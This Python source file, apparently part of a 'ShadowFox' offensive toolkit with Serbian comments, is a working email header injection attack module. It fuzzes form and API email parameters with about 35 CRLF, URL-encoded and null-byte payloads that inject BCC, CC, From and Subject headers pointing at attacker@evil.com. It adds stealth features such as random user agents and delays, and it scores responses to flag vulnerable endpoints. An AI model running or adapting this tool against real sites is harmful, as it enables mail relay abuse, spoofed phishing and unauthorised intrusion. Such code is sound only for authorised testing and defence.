
#!/usr/bin/env python3
"""
🦊 SHADOWFOX EMAIL INJECTION ATTACK MODULE
Specijalizovani modul za Email Injection napade - slanje lažnih mailova
Autor: Whitefox980 | Verzija: 2025.06.06
Cilj: Fuzzovanje email parametara za BCC/CC injection
"""

import requests
import json
import time
import random
import re
from urllib.parse import urljoin, urlparse
import warnings
warnings.filterwarnings("ignore", category=requests.packages.urllib3.exceptions.InsecureRequestWarning)

class ShadowEmailInjection:
    def __init__(self):
        self.session = requests.Session()
        self.results = {
            "mission_info": {},
            "attack_summary": {
                "attack_type": "Email Injection",
                "target_parameters": ["email", "to", "recipient", "from", "sender", "mail", "e-mail"],
                "payloads_tested": 0,
                "vulnerable_endpoints": [],
                "potential_hits": [],
                "false_positives": []
            },
            "detailed_results": [],
            "payload_effectiveness": {},
            "statistics": {}
        }
        self.meta_config = {}
        self.recon_data = {}
        
        # Email Injection payloads - progresivni od basic do advanced
        self.email_payloads = [
            # Basic BCC injection
            "test@example.com\nBCC: attacker@evil.com",
            "test@example.com\rBCC: attacker@evil.com",
            "test@example.com\r\nBCC: attacker@evil.com",
            
            # CC injection
            "test@example.com\nCC: attacker@evil.com",
            "test@example.com\r\nCC: attacker@evil.com",
            
            # Multiple recipients
            "test@example.com\nBCC: evil1@evil.com,evil2@evil.com",
            "test@example.com\r\nBCC: evil1@evil.com\r\nCC: evil2@evil.com",
            
            # Header injection - complete email headers
            "test@example.com\nSubject: PWNED BY SHADOWFOX\nBCC: attacker@evil.com",
            "test@example.com\r\nSubject: Security Test\r\nBCC: security@evil.com",
            "test@example.com\nFrom: admin@target.com\nBCC: attacker@evil.com",
            
            # Content injection
            "test@example.com\n\nThis is injected content!",
            "test@example.com\r\n\r\nInjected email body content",
            
            # Advanced header manipulation
            "test@example.com\nX-Priority: 1\nBCC: attacker@evil.com",
            "test@example.com\nReply-To: attacker@evil.com\nBCC: attacker@evil.com",
            "test@example.com\nReturn-Path: attacker@evil.com",
            
            # MIME injection attempts
            "test@example.com\nContent-Type: text/html\nBCC: attacker@evil.com",
            "test@example.com\nMIME-Version: 1.0\nBCC: attacker@evil.com",
            
            # Unicode and encoding bypasses
            "test@example.com\u000aBCC: attacker@evil.com",
            "test@example.com\u000dBCC: attacker@evil.com",
            "test@example.com%0aBCC: attacker@evil.com",
            "test@example.com%0dBCC: attacker@evil.com",
            "test@example.com%0d%0aBCC: attacker@evil.com",
            
            # Double encoding
            "test@example.com%250aBCC: attacker@evil.com",
            "test@example.com%250d%250aBCC: attacker@evil.com",
            
            # Null byte injection
            "test@example.com\x00BCC: attacker@evil.com",
            "test@example.com%00BCC: attacker@evil.com",
            
            # Tab and space variations
            "test@example.com\tBCC: attacker@evil.com",
            "test@example.com\vBCC: attacker@evil.com",
            "test@example.com\fBCC: attacker@evil.com",
            
            # Case variations
            "test@example.com\nbcc: attacker@evil.com",
            "test@example.com\nBcc: attacker@evil.com",
            "test@example.com\nBCC: attacker@evil.com",
            "test@example.com\ncc: attacker@evil.com",
            
            # Multiple header injection
            "test@example.com\nBCC: evil1@evil.com\nCC: evil2@evil.com\nReply-To: evil3@evil.com"
        ]
        
    def load_configurations(self):
        """Učitavanje Meta config i Recon podataka"""
        try:
            # Meta config
            with open('Meta/mission_info.json', 'r') as f:
                self.meta_config = json.load(f)
                self.results["mission_info"] = self.meta_config
                print(f"🧠 [META] Misija: {self.meta_config.get('mission_id', 'UNKNOWN')}")
                
            # Recon data
            with open('ShadowRecon/shadow_recon.json', 'r') as f:
                self.recon_data = json.load(f)
                print(f"📊 [RECON] Učitano {len(self.recon_data.get('discovered_parameters', {}))} parametara")
                
        except FileNotFoundError as e:
            print(f"❌ [ERROR] Nedostaje fajl: {str(e)}")
            print("🔧 [FIX] Pokreni shadow_recon.py pre ovog modula")
            exit(1)
            
    def setup_session(self):
        """Konfiguracija HTTP sesije"""
        headers = self.meta_config.get('default_headers', {})
        self.session.headers.update(headers)
        
        if self.meta_config.get('stealth_mode', False):
            user_agents = [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
            ]
            self.session.headers['User-Agent'] = random.choice(user_agents)
            
        self.session.verify = False
        self.session.timeout = 15
        
    def intelligent_delay(self):
        """Pametno kašnjenje za stealth mode"""
        if self.meta_config.get('stealth_mode', False):
            delay = self.meta_config.get('rate_delay_seconds', 2.5)
            time.sleep(delay + random.uniform(0, 1.5))
            
    def identify_email_parameters(self):
        """Identifikacija email parametara iz recon podataka"""
        email_keywords = [
            'email', 'e-mail', 'mail', 'to', 'recipient', 'from', 'sender',
            'to_email', 'from_email', 'user_email', 'contact_email',
            'reply_to', 'replyto', 'bcc', 'cc', 'send_to', 'mailto'
        ]
        
        discovered_params = self.recon_data.get('discovered_parameters', {})
        email_params = {}
        
        for param_name, param_data in discovered_params.items():
            param_lower = param_name.lower()
            
            # Direktno poklapanje
            if param_lower in email_keywords:
                email_params[param_name] = param_data
                continue
                
            # Parcijalno poklapanje
            for keyword in email_keywords:
                if keyword in param_lower or param_lower in keyword:
                    email_params[param_name] = param_data
                    break
                    
        print(f"🎯 [TARGET] Pronađeno {len(email_params)} email parametara za testiranje")
        for param in email_params.keys():
            print(f"   • {param}")
            
        return email_params
        
    def test_email_injection(self, endpoint_url, param_name, method='POST'):
        """Test email injection na specifičnom endpoint-u i parametru"""
        results = []
        
        for i, payload in enumerate(self.email_payloads):
            print(f"🔥 [ATTACK] {endpoint_url} | {param_name} | Payload {i+1}/{len(self.email_payloads)}")
            
            try:
                self.intelligent_delay()
                
                # Priprema podataka
                if method.upper() == 'POST':
                    data = {param_name: payload}
                    response = self.session.post(endpoint_url, data=data)
                else:
                    params = {param_name: payload}
                    response = self.session.get(endpoint_url, params=params)
                    
                # Analiza odgovora
                vulnerability_indicators = self.analyze_response(response, payload)
                
                result = {
                    "endpoint": endpoint_url,
                    "parameter": param_name,
                    "method": method,
                    "payload": payload,
                    "payload_type": self.classify_payload(payload),
                    "status_code": response.status_code,
                    "response_length": len(response.content),
                    "response_time": response.elapsed.total_seconds(),
                    "vulnerability_indicators": vulnerability_indicators,
                    "response_headers": dict(response.headers),
                    "is_vulnerable": len(vulnerability_indicators) > 0,
                    "confidence_level": self.calculate_confidence(vulnerability_indicators)
                }
                
                results.append(result)
                self.results["attack_summary"]["payloads_tested"] += 1
                
                # Ako je ranjivo, dodaj u potencijalne hitove
                if result["is_vulnerable"]:
                    self.results["attack_summary"]["potential_hits"].append({
                        "endpoint": endpoint_url,
                        "parameter": param_name,
                        "payload": payload,
                        "confidence": result["confidence_level"]
                    })
                    
            except Exception as e:
                print(f"❌ [ERROR] {endpoint_url}: {str(e)}")
                results.append({
                    "endpoint": endpoint_url,
                    "parameter": param_name,
                    "payload": payload,
                    "error": str(e),
                    "is_vulnerable": False
                })
                
        return results
        
    def analyze_response(self, response, payload):
        """Analiza HTTP odgovora za znakove email injection ranjivosti"""
        indicators = []
        response_text = response.text.lower()
        
        # 1. Error poruke koje ukazuju na email processing
        email_error_patterns = [
            r'mail.*sent',
            r'email.*sent',
            r'message.*sent',
            r'invalid.*email',
            r'mail.*failed',
            r'smtp.*error',
            r'mail.*server',
            r'sendmail.*error',
            r'phpmailer.*error',
            r'swiftmailer.*error'
        ]
        
        for pattern in email_error_patterns:
            if re.search(pattern, response_text):
                indicators.append({
                    "type": "email_processing_detected",
                    "pattern": pattern,
                    "confidence": 0.7
                })
                
        # 2. Success poruke
        success_patterns = [
            r'mail.*successful',
            r'email.*successful',
            r'message.*delivered',
            r'sent.*successfully',
            r'email.*queued'
        ]
        
        for pattern in success_patterns:
            if re.search(pattern, response_text):
                indicators.append({
                    "type": "email_success_detected",
                    "pattern": pattern,
                    "confidence": 0.8
                })
                
        # 3. Header reflection u odgovoru
        injected_headers = ['bcc:', 'cc:', 'subject:', 'from:', 'reply-to:']
        for header in injected_headers:
            if header in payload.lower() and header in response_text:
                indicators.append({
                    "type": "header_reflection",
                    "header": header,
                    "confidence": 0.9
                })
                
        # 4. Response kod analiza
        if response.status_code == 200 and 'bcc:' in payload.lower():
            indicators.append({
                "type": "successful_with_injection",
                "confidence": 0.6
            })
            
        # 5. Response time analiza (može ukazati na email processing)
        if response.elapsed.total_seconds() > 3:
            indicators.append({
                "type": "slow_response_time",
                "time": response.elapsed.total_seconds(),
                "confidence": 0.4
            })
            
        # 6. Content-Type header analiza
        content_type = response.headers.get('Content-Type', '').lower()
        if 'text/plain' in content_type and 'bcc:' in payload.lower():
            indicators.append({
                "type": "plain_text_response",
                "confidence": 0.5
            })
            
        return indicators
        
    def classify_payload(self, payload):
        """Klasifikacija payload-a po tipu"""
        if 'bcc:' in payload.lower():
            return 'BCC_Injection'
        elif 'cc:' in payload.lower():
            return 'CC_Injection'
        elif 'subject:' in payload.lower():
            return 'Subject_Injection'
        elif 'from:' in payload.lower():
            return 'From_Injection'
        elif '%0a' in payload.lower() or '%0d' in payload.lower():
            return 'URL_Encoded_Injection'
        elif '\x00' in payload or '%00' in payload:
            return 'Null_Byte_Injection'
        else:
            return 'Generic_Header_Injection'
            
    def calculate_confidence(self, indicators):
        """Kalkulacija confidence score-a na osnovu indikatora"""
        if not indicators:
            return 0.0
            
        total_confidence = sum(indicator.get('confidence', 0) for indicator in indicators)
        return min(total_confidence, 1.0)  # Max 1.0
        
    def test_forms_for_email_injection(self):
        """Test svih pronađenih formi za email injection"""
        forms_data = self.recon_data.get('forms_found', [])
        email_params = self.identify_email_parameters()
        
        for form in forms_data:
            form_url = form.get('action', '')
            form_method = form.get('method', 'POST')
            
            # Testiraj svaki input u formi koji liči na email
            for input_field in form.get('inputs', []):
                input_name = input_field.get('name', '')
                if input_name in email_params:
                    print(f"🎯 [FORM TEST] {form_url} -> {input_name}")
                    results = self.test_email_injection(form_url, input_name, form_method)
                    self.results["detailed_results"].extend(results)
                    
    def test_api_endpoints_for_email_injection(self):
        """Test API endpoint-a za email injection"""
        api_endpoints = self.recon_data.get('api_endpoints', [])
        email_params = self.identify_email_parameters()
        
        for api in api_endpoints:
            api_url = api.get('url', '')
            
            # Testiraj svaki email parametar na ovom API-ju
            for param_name in email_params.keys():
                print(f"🎯 [API TEST] {api_url} -> {param_name}")
                results = self.test_email_injection(api_url, param_name, 'POST')
                self.results["detailed_results"].extend(results)
                
    def analyze_payload_effectiveness(self):
        """Analiza efikasnosti različitih payload-a"""
        payload_stats = {}
        
        for result in self.results["detailed_results"]:
            payload = result.get("payload", "")
            payload_type = result.get("payload_type", "Unknown")
            is_vulnerable = result.get("is_vulnerable", False)
            confidence = result.get("confidence_level", 0)
            
            if payload_type not in payload_stats:
                payload_stats[payload_type] = {
                    "total_tests": 0,
                    "successful_hits": 0,
                    "average_confidence": 0,
                    "best_confidence": 0
                }
                
            payload_stats[payload_type]["total_tests"] += 1
            if is_vulnerable:
                payload_stats[payload_type]["successful_hits"] += 1
                payload_stats[payload_type]["best_confidence"] = max(
                    payload_stats[payload_type]["best_confidence"], confidence
                )
                
        # Kalkulacija prosečne confidence
        for payload_type, stats in payload_stats.items():
            if stats["successful_hits"] > 0:
                stats["success_rate"] = stats["successful_hits"] / stats["total_tests"]
            else:
                stats["success_rate"] = 0
                
        self.results["payload_effectiveness"] = payload_stats
        
    def generate_statistics(self):
        """Generisanje detaljne statistike napada"""
        total_tests = len(self.results["detailed_results"])
        vulnerable_results = [r for r in self.results["detailed_results"] if r.get("is_vulnerable", False)]
        
        stats = {
            "attack_completed": time.strftime("%Y-%m-%d %H:%M:%S"),
            "total_injection_attempts": total_tests,
            "potentially_vulnerable": len(vulnerable_results),
            "vulnerability_rate": len(vulnerable_results) / total_tests if total_tests > 0 else 0,
            "high_confidence_hits": len([r for r in vulnerable_results if r.get("confidence_level", 0) > 0.7]),
            "unique_vulnerable_endpoints": len(set([r.get("endpoint") for r in vulnerable_results])),
            "most_effective_payload_type": None,
            "avg_response_time": 0
        }
        
        # Najefektiji payload tip
        if self.results["payload_effectiveness"]:
            best_payload = max(
                self.results["payload_effectiveness"].items(),
                key=lambda x: x[1].get("success_rate", 0)
            )
            stats["most_effective_payload_type"] = best_payload[0]
            
        # Prosečno vreme odgovora
        response_times = [r.get("response_time", 0) for r in self.results["detailed_results"] if "response_time" in r]
        if response_times:
            stats["avg_response_time"] = sum(response_times) / len(response_times)
            
        self.results["statistics"] = stats
        
        # Update attack summary
        self.results["attack_summary"]["vulnerable_endpoints"] = list(set([
            r.get("endpoint") for r in vulnerable_results
        ]))
        
    def save_results(self):
        """Snimanje rezultata u attack_email_injection.json"""
        output_file = "Napad/attack_email_injection.json"
        
        try:
            with open(output_file, 'w') as f:
                json.dump(self.results, f, indent=2, ensure_ascii=False)
            print(f"💾 [SAVE] Rezultati snimljeni: {output_file}")
        except Exception as e:
            print(f"❌ [SAVE ERROR] {str(e)}")
            
    def display_summary(self):
        """Prikaz sažetka email injection napada"""
        stats = self.results["statistics"]
        print("\n🎯 SHADOWFOX EMAIL INJECTION - SAŽETAK")
        print("=" * 60)
        print(f"📧 Testova: {stats['total_injection_attempts']}")
        print(f"🔥 Potencijalno ranjivo: {stats['potentially_vulnerable']}")
        print(f"📊 Stopa ranjivosti: {stats['vulnerability_rate']:.2%}")
        print(f"⚡ Visoka pouzdanost: {stats['high_confidence_hits']}")
        print(f"🎯 Ranjivi endpoint-i: {stats['unique_vulnerable_endpoints']}")
        
        if stats.get("most_effective_payload_type"):
            print(f"🏆 Najefektiji payload: {stats['most_effective_payload_type']}")
            
        # Prikaz top potencijalnih hitova
        potential_hits = self.results["attack_summary"]["potential_hits"]
        if potential_hits:
            print(f"\n🚨 TOP POTENCIJALNI HITOVI:")
            for hit in sorted(potential_hits, key=lambda x: x['confidence'], reverse=True)[:5]:
                print(f"   • {hit['endpoint']} -> {hit['parameter']} (confidence: {hit['confidence']:.2f})")
                
        print(f"\n✅ Detaljni rezultati: Napad/attack_email_injection.json")
        
    def run_attack(self):
        """Glavna email injection attack operacija"""
        print("🦊 SHADOWFOX EMAIL INJECTION ATTACK - POKRETANJE")
        print("=" * 60)
        
        # 1. Učitaj konfiguracije
        self.load_configurations()
        
        # 2. Podesi sesiju
        self.setup_session()
        
        # 3. Identifikuj email parametre
        email_params = self.identify_email_parameters()
        if not email_params:
            print("❌ [ERROR] Nisu pronađeni email parametri za testiranje!")
            return
            
        # 4. Test formi
        print("📝 [ATTACK] Testiranje formi...")
        self.test_forms_for_email_injection()
        
        # 5. Test API endpoint-a
        print("🔌 [ATTACK] Testiranje API endpoint-a...")
        self.test_api_endpoints_for_email_injection()
        
        # 6. Analiza efikasnosti payload-a
        print("📊 [ANALYSIS] Analiza efikasnosti payload-a...")
        self.analyze_payload_effectiveness()
        
        # 7. Generisanje statistike
        print("📈 [STATS] Generisanje statistike...")
        self.generate_statistics()
        
        # 8. Snimanje rezultata
        self.save_results()
        
        # 9. Prikaz sažetka
        self.display_summary()

def main():
    attacker = ShadowEmailInjection()
    attacker.run_attack()

if __name__ == "__main__":
    main()

